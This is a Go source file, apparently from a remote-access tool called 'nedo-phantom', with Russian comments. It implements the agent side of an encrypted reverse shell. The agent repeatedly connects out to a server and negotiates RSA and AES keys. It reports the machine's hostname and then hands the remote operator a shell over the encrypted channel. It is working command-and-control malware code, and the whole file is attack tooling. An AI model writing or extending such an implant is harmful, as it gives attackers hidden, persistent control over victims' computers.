package core

import (
		"encoding/binary"
    "fmt"
    "net"
    "os"
    "time"
		"nedo-phantom/internal/agent/crypto"
    "nedo-phantom/internal/common"
)

type Agent struct {
    serverAddr string
    conn       net.Conn
    hostname   string
		crypto 		 *crypto.Crypto
}

func NewAgent(serverAddr string) *Agent {
    hostname, _ := os.Hostname()
    return &Agent{
        serverAddr: serverAddr,
        hostname:   hostname,
    }
}

func (a *Agent) Run() {
    for {
        if err := a.connect(); err != nil {
            fmt.Printf("[!] Connection error: %v, retry in 10s\n", err)
            time.Sleep(10 * time.Second)
            continue
        }
        
        a.handleConnection()
        a.conn.Close()
        time.Sleep(5 * time.Second)
    }
}

func (a *Agent) connect() error {
    conn, err := net.Dial("tcp", a.serverAddr)
    if err != nil {
        return err
    }
    a.conn = conn
    return nil
}

func (a *Agent) handleConnection() {
		// 1. Создаем крипто объект
		var err error
		a.crypto, err = crypto.NewCrypto()
		if err != nil {
				fmt.Printf("[-] Failed to create crypto: %v\n", err)
				return
		}
		fmt.Println("[+] RSA key pair generated")

		// 2. Отправляем публичный ключ в PEM
		pem, err := a.crypto.GetPublicKeyPEM()
		if err != nil {
				fmt.Printf("[-] Failed to get public key PEM: %v\n", err)
				return
		}

		// Отправляем с префиксом KEY: чтобы сервер понял
		if _, err := a.conn.Write([]byte("KEY:" + pem + "\n")); err != nil {
				fmt.Printf("[-] Failed to send public key: %v\n", err)
		}
		fmt.Println("[+] Public key sent to server")

		// 3. Получаем зашифрованный AES ключ от сервера
		// Сервер пришлет 4 байта длины + зашифрованный ключ
		lengthBuf := make([]byte, 4)
		if _, err := a.conn.Read(lengthBuf); err != nil {
				fmt.Printf("[-] Failed to read key length: %v\n", err)
				return
		}
		keyLength := binary.BigEndian.Uint32(lengthBuf)

		encryptedKey := make([]byte, keyLength)
		if _, err := a.conn.Read(encryptedKey); err != nil {
				fmt.Printf("[-] Failed to read encrypted key: %v\n", err)
				return
		}
		fmt.Printf("[+] Received encrypted AES key (%d bytes)\n", keyLength)

		// 4. Расшифровываем AES ключ
		if err := a.crypto.SetSymmetricKey(encryptedKey); err != nil {
				fmt.Printf("[-] Failed to decrypt AES key: %v\n", err)
				return
		}
		fmt.Println("[+] AES key decrypted succesfully")

		// 5. Создаем зашифрованное соединение
		secureConn := common.NewSecureConn(a.conn, a.crypto)
		fmt.Println("[+] Secure connection established")

		// 6. Отправляем hostname через зашифрованное соединение
		if _, err := secureConn.Write([]byte(a.hostname + "\n")); err != nil {
				fmt.Printf("[-] Failed to send hostname: %v\n", err)
				return
		}
		fmt.Printf("[+] Hostname '%s' sent securely\n", a.hostname)
    
		// 7. Запускаем шелл с шифрованным соединением
    shell := NewShell(secureConn)
    shell.Run()
}
